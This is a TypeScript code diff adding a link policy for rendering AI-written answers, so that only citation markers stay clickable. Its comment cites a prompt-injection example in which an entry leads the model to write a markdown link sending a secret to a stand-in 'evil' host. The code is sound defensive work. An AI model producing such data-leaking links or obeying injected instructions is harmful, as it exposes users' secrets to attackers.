@@ -41,6 +41,15 @@ export function citationFromHref(href: string | null | undefined): number | null
 }
 
 /**
+ * Link policy for answers: only citation markers stay clickable. Any other link the model
+ * writes (possibly prompt-injected from an entry, e.g. `[here](https://evil/?q=<secret>)`)
+ * renders as plain text.
+ */
+export function isCitationLink(href: string): boolean {
+  return citationFromHref(href) !== null;
+}
+
+/**
  * Text that is safe to render as Markdown mid-stream: cut at the last word boundary and hide
  * a trailing unclosed `**`, `*`, `` ` `` or `[` so formatting doesn't flash raw → styled.
  */
